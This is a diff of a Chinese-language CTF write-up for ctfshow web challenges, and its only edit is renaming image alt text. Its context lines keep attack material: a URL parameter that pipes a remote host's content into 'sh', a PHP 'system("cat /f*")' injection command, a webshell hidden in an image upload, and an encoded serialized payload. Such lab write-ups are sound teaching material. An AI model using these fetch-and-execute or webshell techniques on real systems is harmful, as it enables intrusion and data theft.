@@ -271,7 +271,7 @@ if($schema==="https://"){
 ?url=https://ctf.baozongwi.xyz:4444|sh
 ```
 
-![1](./assets/001.jpg)
+![image](./assets/001.jpg)
 
 不过他是直接放命令进去的，可以直接截断
 
@@ -826,7 +826,7 @@ python3 1.py -c '<?php system("cat /f*");?>' -p 28136 pwn.challenge.ctf.show /us
 
 后面找the0n3师傅交流了一下，我的疑问是为什么你们都写的是`System.php`，因为我看了P牛的文章是`PEAR.php`，为了帮助我，他起了一个docker进去docker查看文件，发现
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
 进行了尝试，发现`*cmd.php`，不可以，但是`system.php`，`PEAR.php`以及`index.php`都可以
 
@@ -1229,7 +1229,7 @@ if(strlen($_FILES['file']['tmp_name'])>0){
 
 `getimagesize`限制了，所以上传的必须是图片，并且把一句话藏在里面不会解码失败，那直接补上一个编码之后为4的倍数的就可以了
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 ## web821
 
@@ -1297,7 +1297,7 @@ if __name__ == "__main__":
 
 ```
 
-![1](./assets/004.jpg)
+![image](./assets/004.jpg)
 
 ## web822
 
@@ -1345,7 +1345,7 @@ select * from ctfshow_secret;
 
 延迟特别高
 
-![1](./assets/005.jpg)
+![image](./assets/005.jpg)
 
 ## web823
 
@@ -1777,7 +1777,7 @@ userData=%72%4f%30%41%42%58%4e%79%41%42%64%6a%62%32%30%75%59%33%52%6d%63%32%68%7
 
 写了一个父类
 
-![1](./assets/006.jpg)
+![image](./assets/006.jpg)
 
 但是其中子类是继承了父类的，所以直接赋值就好了
 
